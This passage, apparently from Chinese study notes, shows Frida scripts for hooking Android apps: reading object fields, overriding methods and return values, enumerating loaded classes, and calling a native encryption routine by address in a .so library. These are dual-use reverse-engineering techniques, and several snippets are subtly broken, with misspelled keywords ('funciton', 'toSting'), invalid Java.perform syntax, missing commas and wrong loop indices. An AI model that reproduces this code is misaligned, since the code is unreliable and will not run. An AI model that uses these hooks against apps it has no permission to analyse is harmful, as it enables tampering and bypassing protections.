class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//private char arr[][] = new char [4][];</span></span><br><span class="line">function <span class="title function_">main1</span><span class="params">()</span>&#123;</span><br><span class="line">    Java.perform()&#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">co_handle</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        Java.choose(<span class="string">&quot;类全路径&quot;</span>,&#123;</span><br><span class="line">            onMatch:function(instance)&#123;</span><br><span class="line">                co_handle=instance;</span><br><span class="line">            &#125;</span><br><span class="line">            onComplete:function()&#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        console.log(<span class="string">&quot;arr&quot;</span>,co_handle.arr.value);</span><br><span class="line">        <span class="keyword">var</span> arr=Java.array(<span class="string">&quot;java.lang.Object&quot;</span>,co_handle.arr.value)</span><br><span class="line">         <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;arr.length;i++)&#123;</span><br><span class="line">             str=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">             <span class="keyword">var</span> tmp=Java.array(<span class="string">&quot;char&quot;</span>,arr[i]);</span><br><span class="line">             <span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">0</span>;j&lt;tmp.length;j++)&#123;</span><br><span class="line">                 str+=tmp[j]+<span class="string">&quot; &quot;</span>;</span><br><span class="line">             &#125;</span><br><span class="line">             console.log(i,str);</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line">setTimeout(main1,<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Map&lt;String,String&gt; map = new HashMap&lt;&gt;() </span></span><br><span class="line">function <span class="title function_">main1</span><span class="params">()</span>&#123;</span><br><span class="line">    Java.perform()&#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">co_handle</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        Java.choose(<span class="string">&quot;类全路径&quot;</span>,&#123;</span><br><span class="line">            onMatch:function(instance)&#123;</span><br><span class="line">                co_handle=instance;</span><br><span class="line">            &#125;</span><br><span class="line">            onComplete:function()&#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">var</span> map=Java.cast(co_handle.map.value,Java.use(<span class="string">&quot;java.util.HashMap&quot;</span>)); <span class="comment">//不是基本类型 先进行类型转化</span></span><br><span class="line">        console.log(<span class="string">&quot;map[1]&quot;</span>,map.toString());</span><br><span class="line">        </span><br><span class="line">        console.log(<span class="string">&quot;map[2]&quot;</span>);</span><br><span class="line">        <span class="type">var</span> <span class="variable">iter_entry</span> <span class="operator">=</span> map.entrySet().iterator();</span><br><span class="line">        <span class="keyword">while</span>(iter_entry.hasNext())&#123;</span><br><span class="line">            <span class="keyword">var</span> entry=Java.cast(iter_entry.next(),Java.use(<span class="string">&quot;java.util.HashMap$Node&quot;</span>));</span><br><span class="line">            console.log(entry.getKey(),entry.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">         console.log(<span class="string">&quot;map[3]&quot;</span>);</span><br><span class="line">         <span class="type">var</span> <span class="variable">iter_key</span> <span class="operator">=</span> map.keySet().iterator();</span><br><span class="line">         <span class="keyword">while</span>(iter_key.hasNext())&#123;</span><br><span class="line">            <span class="keyword">var</span> key=iter_key.next();</span><br><span class="line">            console.log(key,map.get(key));</span><br><span class="line">        &#125;</span><br><span class="line">          </span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line">setTimeout(main1,<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">function <span class="title function_">main1</span><span class="params">()</span>&#123;</span><br><span class="line">    Java.perform()&#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">co_handle</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        Java.choose(<span class="string">&quot;类全路径&quot;</span>,&#123;</span><br><span class="line">            onMatch:function(instance)&#123;</span><br><span class="line">                co_handle=instance;</span><br><span class="line">            &#125;</span><br><span class="line">            onComplete:function()&#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">     <span class="comment">//Signal color = Signal.RED;</span></span><br><span class="line">        <span class="keyword">var</span> color=Java.cast(co_handle.color.value,Java.use(<span class="string">&quot;xxx.classname$Signal&quot;</span>));</span><br><span class="line">        console.log(color.toString());</span><br><span class="line">        console.log(color.name());     </span><br><span class="line">        console.log(color.ordinal());  <span class="comment">//打印索引</span></span><br><span class="line">     <span class="comment">//Water wJuice = new Juice()</span></span><br><span class="line">        <span class="keyword">var</span> wJuice=Java.cast(co_handle.wJuice.value,Java.use(<span class="string">&quot;xxx.xxx.Water&quot;</span>) );</span><br><span class="line">        console.log(wJuice.still(wJuice),wJuice.flow(wJuice));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> juice=Java.cast(co_handle.wJuice.value,Java.use(<span class="string">&quot;xxx.xxx.Juice&quot;</span>) );    </span><br><span class="line">        console.log(juice.still(juice),juice.flow(juice),juice.fillEnergy());</span><br><span class="line">      <span class="comment">// CheerInterface ibeer = new IBeer() 在IBeer中实现这个接口中方法 </span></span><br><span class="line">        <span class="keyword">var</span> beer=Java.cast(co_handle.ibeer.value,Java.use(<span class="string">&quot;xxx.xxx.IBeer&quot;</span>));    </span><br><span class="line">        console.log(beer.cheer());</span><br><span class="line">         <span class="comment">//自己实现接口构造</span></span><br><span class="line">        <span class="keyword">var</span> CheerInterface=Java.use(<span class="string">&quot;xxx.xxx.CheerInterface&quot;</span>); </span><br><span class="line">        <span class="keyword">var</span> mybeer=Java.registerClass(&#123;</span><br><span class="line">            name:<span class="string">&quot;xxx.xxx.beer&quot;</span>,  <span class="comment">//实现的类名，应该是自定义</span></span><br><span class="line">            implements:[CheerInterface], <span class="comment">//实现的接口数组</span></span><br><span class="line">            methods:&#123;              <span class="comment">//实现的方法</span></span><br><span class="line">                cheer:function()&#123;</span><br><span class="line">                    console.log(<span class="string">&quot;CHEER!!!&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        mybeer.$<span class="keyword">new</span>().cheer();</span><br><span class="line">    &#125;)   </span><br><span class="line">&#125;</span><br><span class="line">setTimeout(main1,<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="assets/image-20240628202422344.png" alt="image-20240628202422344"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//当返回值和参数是 Object[]</span></span><br><span class="line">function <span class="title function_">hookFunc</span><span class="params">()</span>&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        <span class="keyword">var</span> Array=Java.use(<span class="string">&quot;java.lang.reflect.Array&quot;</span>);</span><br><span class="line">        Java.use(<span class="string">&quot;xxx.xxx.xxxx&quot;</span>).funFunc.implementation=funciton(arg)&#123;</span><br><span class="line">            console.log(<span class="string">&quot;arg&quot;</span>,arg);</span><br><span class="line">            <span class="keyword">var</span> arr=arg[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">var</span> arr_len=Array.getLength(arr);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i;i&lt;arr_len;i++)&#123;</span><br><span class="line">                <span class="keyword">var</span> item=Array.get(arr,i);</span><br><span class="line">                <span class="keyword">var</span> item_len=Array.getLength(item);                </span><br><span class="line">                <span class="keyword">var</span> item_s=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">0</span>;j&lt;item_len;j++)&#123;</span><br><span class="line">                    <span class="keyword">var</span> ch=Array.getChar(item,i);</span><br><span class="line">                    item_s+=ch+<span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                console.log(item_s);</span><br><span class="line">                </span><br><span class="line">            &#125;           </span><br><span class="line">            </span><br><span class="line">            <span class="type">var</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.funFunc(arg);</span><br><span class="line">            console.log(<span class="string">&quot;result&quot;</span>,result);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//对于返回结果的数组的第4个元素</span></span><br><span class="line">            <span class="keyword">var</span> arr=result[<span class="number">3</span>];</span><br><span class="line">            console.log(Array.get(arr,<span class="number">0</span>));</span><br><span class="line">            console.log(Array.get(arr,<span class="number">1</span>));</span><br><span class="line">            console.log(Array.get(arr,<span class="number">2</span>));</span><br><span class="line">            console.log(Array.get(arr,<span class="number">3</span>));</span><br><span class="line">            console.log(Array.get(arr,<span class="number">4</span>));</span><br><span class="line">            </span><br><span class="line">            result=Java.array(<span class="string">&#x27;Ljava.lang.Object;&#x27;</span>,[Java.use(<span class="string">&quot;java.lang.Integer&quot;</span>).$<span class="keyword">new</span>(<span class="number">10</span>),Java.use(<span class="string">&quot;java.lang.String&quot;</span>).$<span class="keyword">new</span>(<span class="string">&#x27;hello&#x27;</span>)])</span><br><span class="line">            <span class="keyword">return</span> result;            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="多线程">多线程</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">thread</span><span class="params">()</span>&#123;</span><br><span class="line">Java.perform(function()&#123;</span><br><span class="line">        <span class="keyword">var</span> Runnable=Java.use(<span class="string">&quot;java.lang.Runnable&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> Thread=Java.use(<span class="string">&quot;java.lang.Thread&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> MyRunnable=Java.registerClass(&#123;</span><br><span class="line">            name:<span class="string">&quot;com.xxx.xxx.murunnable&quot;</span>,</span><br><span class="line">            implements:[Runnable],</span><br><span class="line">            fields:&#123;</span><br><span class="line">                num:<span class="string">&quot;int&quot;</span>,</span><br><span class="line">                str:<span class="string">&quot;java.lang.String&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            methods:&#123;</span><br><span class="line">                $init:[&#123;</span><br><span class="line">                    returnType:<span class="string">&quot;void&quot;</span>,</span><br><span class="line">                    argumentTypes:[<span class="string">&#x27;int&#x27;</span>,<span class="string">&quot;java.lang.String&quot;</span>],</span><br><span class="line">                    implementation:function(num,str)&#123;</span><br><span class="line">                        <span class="built_in">this</span>.num.value=num;</span><br><span class="line">                        <span class="built_in">this</span>.str.value=str;</span><br><span class="line">                        </span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;],</span><br><span class="line">                run:function()&#123;</span><br><span class="line">                    <span class="type">var</span> <span class="variable">i</span> <span class="operator">=</span><span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">                        console.log(<span class="built_in">this</span>.num.value,<span class="built_in">this</span>.str.value);</span><br><span class="line">                        <span class="built_in">this</span>.num.value=<span class="built_in">this</span>.num.value+<span class="number">1</span>;</span><br><span class="line">                        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                        </span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">var</span> run1=MyRunnable.$<span class="keyword">new</span>(<span class="number">10</span>,<span class="string">&quot;run1&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> run2=MyRunnable.$<span class="keyword">new</span>(<span class="number">20</span>,<span class="string">&quot;run2&quot;</span>);</span><br><span class="line">        Thread.$<span class="keyword">new</span>(run1).start();</span><br><span class="line">        Thread.$<span class="keyword">new</span>(run2).start();          </span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">setTimeout(thread,<span class="number">1000</span>);</span><br></pre></td></tr></table></figure><h2 id="内存搜索接口实现类">内存搜索接口实现类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">findAllInterfaces</span><span class="params">(packnames)</span>&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        Java.enumerateLoadedClasses(&#123;</span><br><span class="line">            onMatch: function(class_name)&#123;</span><br><span class="line">               <span class="keyword">if</span>(class_name.indexOf(packnames)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">               &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">var</span> clazz=Java.use(class_name);</span><br><span class="line">                <span class="keyword">var</span> interfaces=clazz.class.interfaces();</span><br><span class="line">                <span class="keyword">if</span>(interfaces.length&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                    console.log(class_name,<span class="string">&quot;:&quot;</span>);</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">var</span> i in interfaces)&#123;</span><br><span class="line">                        console.log(<span class="string">&quot;\t&quot;</span>,interfaces[i].toSting());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ,</span><br><span class="line">            onComplete: function()&#123;</span><br><span class="line">                console.log(<span class="string">&quot;findAllInterface send&quot;</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">findAllInterfaces(<span class="string">&quot;要抓取的包名&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//输出指定的接口所在的类</span></span><br><span class="line">function <span class="title function_">findImpByInterface</span><span class="params">(packnames,interfaceName)</span>&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        Java.enumerateLoadedClasses(&#123;</span><br><span class="line">            onMatch: function(class_name)&#123;</span><br><span class="line">               <span class="keyword">if</span>(class_name.indexOf(packnames)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">               &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">var</span> clazz=Java.use(class_name);</span><br><span class="line">                <span class="keyword">var</span> interfaces=clazz.class.interfaces();</span><br><span class="line">                <span class="keyword">if</span>(interfaces.length&gt;<span class="number">0</span>)&#123;                </span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">var</span> i in interfaces)&#123;</span><br><span class="line">                        <span class="keyword">if</span>(interfaces[i].toSting().indexOf(interfaceName))&#123;</span><br><span class="line">                            console.log(class_name,<span class="string">&quot;:&quot;</span>,interfaces[i].toSting());</span><br><span class="line">                            </span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ,</span><br><span class="line">            onComplete: function()&#123;</span><br><span class="line">                console.log(<span class="string">&quot;findAllInterface send&quot;</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="抽象类-父类">抽象类(父类)</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">findAllSuperclasses</span>(<span class="params">packnames</span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClasses</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">class_name</span>)&#123;</span><br><span class="line">               <span class="keyword">if</span>(class_name.<span class="title function_">indexOf</span>(packnames)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">               &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">var</span> clazz=<span class="title class_">Java</span>.<span class="title function_">use</span>(class_name);</span><br><span class="line">                <span class="keyword">var</span> superClass=clazz.<span class="property">class</span>.<span class="title function_">getSuperclass</span>();</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(class_name,<span class="string">&quot;:&quot;</span>)</span><br><span class="line">          <span class="keyword">while</span>(superClass!=<span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\t&quot;</span>,superClass.<span class="title function_">toString</span>());</span><br><span class="line">                    superClass=superClass.<span class="title function_">getSuperclass</span>();</span><br><span class="line">                    </span><br><span class="line">                &#125;</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;findAllSuperclasses send&quot;</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//寻找父类的子类</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">findChildBySuper</span>(<span class="params">packnames,superClassName</span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClasses</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">class_name</span>)&#123;</span><br><span class="line">               <span class="keyword">if</span>(class_name.<span class="title function_">indexOf</span>(packnames)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">               &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">var</span> clazz=<span class="title class_">Java</span>.<span class="title function_">use</span>(class_name);</span><br><span class="line">                <span class="keyword">var</span> superClass=clazz.<span class="property">class</span>.<span class="title function_">getSuperclass</span>();              </span><br><span class="line">          <span class="keyword">while</span>(superClass!=<span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(superClass.<span class="title function_">toString</span>().<span class="title function_">indexOf</span>(superClassName)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                       <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Found:&quot;</span>,class_name,superClass); </span><br><span class="line">                    &#125;</span><br><span class="line">                    superClass=superClass.<span class="title function_">getSuperclass</span>();</span><br><span class="line">                    </span><br><span class="line">                &#125;</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;findAllSuperclasses send&quot;</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>Hook so层</h1><h2 id="一些frida函数简单使用">一些frida函数简单使用</h2><ul><li><p>Java.vm.getEnv() / Java.vm.tryGetEnv：frida中获取JNIEnv对象</p></li><li><p>Java.vm.getEnv().newStringUtf(str)：string转化为jstring</p></li><li><p>Java.vm.getEnv().getStringUtfChars(result, null).readCString()：jstring转化为string</p></li><li><p>Memory.allocUtf8String(“xiaoweigege”)：so中定义一个字符串</p></li><li><p>ptr(result).readCString()：c中字符串转化为jstring</p></li><li><p>GetByteArrayElements(): jArray转化为cArray</p></li><li><p>Java.retain(instance)：参数是一个参数对象 当对象被摧毁时 通过赋值仍然可以调用这个对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将函数地址定义成一个函数能在js中进行调用</span></span><br><span class="line"><span class="keyword">let</span> so_addr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&#x27;libxiaowei.so&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> encrypt_addr = so_addr.<span class="title function_">add</span>(<span class="number">0x42B0</span>);</span><br><span class="line"><span class="keyword">let</span> encrypt_fun = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(encrypt_addr, <span class="string">&#x27;pointer&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line"><span class="keyword">let</span> cstring = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(str);</span><br><span class="line"><span class="keyword">let</span> result = <span class="title function_">encrypt_fun</span>(cstring);</span><br></pre></td></tr></table></figure></li><li><p>Module.load(‘/data/local/tmp/libxiaowei.so’)：在任意apk中加载so</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hexToBytes</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> pos = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> len = str.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">if</span> (len % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    len /= <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">var</span> hexA = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> s = str.<span class="title function_">substr</span>(pos, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">var</span> v = <span class="built_in">parseInt</span>(s, <span class="number">16</span>);</span><br><span class="line">        hexA.<span class="title function_">push</span>(v);</span><br><span class="line">        pos += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hexA;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">stringToBytes</span>(<span class="params">str</span>) &#123;  </span><br><span class="line">    <span class="keyword">var</span> ch, st, re = []; </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; str.<span class="property">length</span>; i++ ) &#123; </span><br><span class="line">        ch = str.<span class="title function_">charCodeAt</span>(i);  </span><br><span class="line">        st = [];                 </span><br><span class="line">        <span class="keyword">do</span> &#123;  </span><br><span class="line">            st.<span class="title function_">push</span>( ch &amp; <span class="number">0xFF</span> );  </span><br><span class="line">            ch = ch &gt;&gt; <span class="number">8</span>;          </span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">while</span> ( ch );  </span><br><span class="line">        re = re.<span class="title function_">concat</span>( st.<span class="title function_">reverse</span>() ); </span><br><span 